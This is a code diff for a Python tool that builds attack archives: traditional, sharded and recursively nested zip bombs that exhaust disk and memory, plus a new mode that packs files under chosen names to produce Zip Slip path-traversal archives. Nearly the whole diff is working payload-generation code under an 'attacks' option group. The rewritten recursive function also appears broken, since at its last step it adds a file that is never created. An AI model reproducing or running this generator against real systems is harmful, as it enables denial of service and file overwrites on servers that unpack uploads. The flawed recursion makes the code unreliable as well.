@@ -37,7 +37,10 @@ def validate_args(args: argparse.Namespace) -> bool:
         logger.error("Cannot have more than one size modifer at a time.")
         logger.debug(f"Found {size}")
         return False
-    elif len(size) == 0:
+    elif ((args.slip is True) and (args.slip_file is None)):
+        logger.error("Must have file name for slip attack")
+        return False
+    elif ((len(size) == 0) and (args.slip is False)):
         logger.error("Must have at least one configured size.")
         return False
     mode = [x for x in (args.t, args.recursive, args.shard, args.slip) if x is True]
@@ -49,10 +52,10 @@ def validate_args(args: argparse.Namespace) -> bool:
     elif len(mode) == 0:
         logger.error("Select a generation mode")
         return False
+    # need a case to determine validity of depth with recursive
     return True
 
-
-def traditional(size: float, name: str, comp=1) -> None:
+def traditional(size: float, name: str, comp=5) -> None:
     to_write = b"X" * size
     logger.info(f"Starting material generation of size {len(to_write)} bytes")
     if len(to_write) > 26843545500:
@@ -63,7 +66,7 @@ def traditional(size: float, name: str, comp=1) -> None:
         zf.close()
     logger.info(f"Zip file: {name} created")
 
-def shard(size: float, name: str, comp=1, number=5) -> None:
+def shard(size: float, name: str, comp=5, number=5) -> None:
     to_write = b"X" * size
     logger.info(f"Starting material generation of size {len(to_write)} bytes")
     if len(to_write) > 26843545500:
@@ -71,70 +74,52 @@ def shard(size: float, name: str, comp=1, number=5) -> None:
     with z.ZipFile(name,'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
         for x in range(0, number):
             zf.writestr(f"shard-{x}.dat", to_write)
-            logger.info(f"Wrote shard number {x}")
+            logger.debug(f"Wrote shard number {x}")
         zf.close()
     logger.info(f"Zip file: {name} created.")
 
-def recursive(size: float, name: str, comp=1, depth=2):
-    """
-    file.zip
-    |-> level3.zip
-    |    |-> large_file3.dat
-    |----> level2.zip
-    |        |-> large_file2.dat
-    |-------->level1.zip
-    |            |- large_file1.dat
-    """
+def recursive(size:float, name:str, comp=5, depth=3, is_first=True):
+    logger.debug(f"recursive called: size={size},name={name},comp={comp},depth={depth},if_first={is_first}")
+    if depth == 1:
+        #write the final zip file and exit
+        with z.ZipFile(name,'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
+            zf.write(f"level-{depth}.zip")
+            zf.close()
+        remove(f"level-{(depth+1)}.zip")
+        return
+    elif is_first:
+        # this run will create the file with specified size
+        with z.ZipFile(f"level-{depth}.zip",'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
+            to_write = b"X" * size
+            logger.info(f"Starting material generation of size {len(to_write)} bytes")
+            if len(to_write) > 26843545500:
+                logger.warning(f"Writting a file larger than 25Gb, this will consume system resources")
+            zf.writestr("data.bin",to_write)
+            zf.close()
+        recursive(size, name, comp=comp, depth=(depth-1), is_first=False)
+    else:
+        with z.ZipFile(f"level-{depth}.zip",'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
+            zf.write(f"level-{(depth+1)}.zip")
+            zf.close()
+        remove(f"level-{(depth+1)}.zip")
+        recursive(size, name, comp=comp, depth=(depth-1), is_first=False)
 
-    to_write = b"X" * size
-    logger.info(f"Starting material generation of size {len(to_write)} bytes")
-    if len(to_write) > 26843545500:
-        logger.warning(f"Writting a file larger than 25Gb, this will consume system resources")
+
+def slip(zip_name: list, file_name: str,comp=5):
     # static depth for now. need to figure out dynamic
-    with z.ZipFile(name, 'w', compression=z.ZIP_DEFLATED, compresslevel=comp) as zf:
-        with z.ZipFile('level3.zip','w',compression=z.ZIP_DEFLATED, compresslevel=comp) as l1:
-            with z.ZipFile('level2.zip','w',compression=z.ZIP_DEFLATED,compresslevel=comp) as l2:
-                with z.ZipFile('level1.zip','w',compression=z.ZIP_DEFLATED,compresslevel=comp) as l3:
-                    l3.writestr('data.bin',to_write)
-                    l3.close()
-                l2.write('level1.zip')
-                remove('level1.zip')
-                l2.close()
-            l1.write('level2.zip')
-            remove('level2.zip')
-            l1.close()
-        zf.write('level3.zip')
-        remove('level3.zip')
+    with z.ZipFile(zip_name, 'w', compression=z.ZIP_DEFLATED, compresslevel=comp) as zf:
+        for name in file_name:
+            zf.writestr(name, "")
         zf.close()
-    logger.info(f'finished generating file: {name}')
-    # with z.ZipFile(name, 'w', compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
-    #     for x in range(0,depth):
-    #         print(f"x is {x}")
-    #         with z.ZipFile(f"level-{x}.zip", 'w', compression=z.ZIP_DEFLATED,compresslevel=comp ) as inner_zip:
-    #             logger.debug(f"now inside level-{x}.zip")
-    #             inner_zip.writestr("data.dat", to_write)
-    #             logger.debug("Wrote data.dat to zipfile.")
-    #             if x == 0:
-    #                 print(f"found 0, closing zip")
-    #                 inner_zip.close()
-    #                 logger.debug("closed inner zip file, x was 0")
-    #             else:
-    #                 #inner_zip.write(f"level-{(x-1)}.zip")
-    #                 inner_zip.close()
-    #                 logger.debug("closed inner zip file, x was larger than 0")
-
-    #         logger.debug(f"Outside the with block, now attempting to save level-{x}.zip")
-    #         zf.write(f"level-{x}.zip")
-    #         logger.debug(f"now cleaning up level-{x}.zip")
-    #         remove(f"level-{x}.zip")
-    #     zf.close()
-
+    logger.info(f"Generated zip file: {zip_name}")
+        
 
 def main(args):
     logger.debug(f"found args: {args}")
     if ( validate_args(args) ):
         logger.info(f"Starting")
         if args.t:
+            # need better way to handle size args
             if args.Sb:
                 traditional(args.Sb, args.outFile, args.compression)
             elif args.Sk:
@@ -161,14 +146,11 @@ def main(args):
                 recursive((args.Sm * MB), args.outFile, args.compression, args.depth)
             else:
                 recursive((args.Sg * GB), args.outFile, args.compression, args.depth)
-            # if args.Sb:
-            #     shard(args.Sb, args.outFile, args.compression, args.shard_num)
-            # elif args.Sk:
-            #     shard((args.Sk * KB), args.outFile, args.compression, args.shard_num)
-            # elif args.Sm:
-            #     shard((args.Sm * MB), args.outFile, args.compression, args.shard_num)
-            # else:
-            #     shard((args.Sg * GB), args.outFile, args.compression, args.shard_num)
+        elif args.slip:
+            slip(args.outFile, args.slip_file, args.compression)
+        else:
+            print("SOMETHING WENT WRONG")
+            exit()
 
 
 if __name__ == "__main__":
@@ -178,6 +160,7 @@ if __name__ == "__main__":
     size_manip = parser.add_argument_group(title="Size Modifiers", description="File size of compressed files.")
     attacks.add_argument("-r","--recursive", help="Generate recursive zip bomb", action="store_true")
     attacks.add_argument("-s","--slip",help="Generate Zip Slip", action='store_true')
+    attacks.add_argument('-sf','--slip-file',action='extend',nargs='*',help="slip file name to store, can provide multiple names")
     attacks.add_argument("-x","--shard", help="Generate Sharded zip bomb",action='store_true')
     attacks.add_argument("-xn","--shard-num",help="Number of shards to create", type=int)
     attacks.add_argument("-t", help="traditional zip bomb",action='store_true')
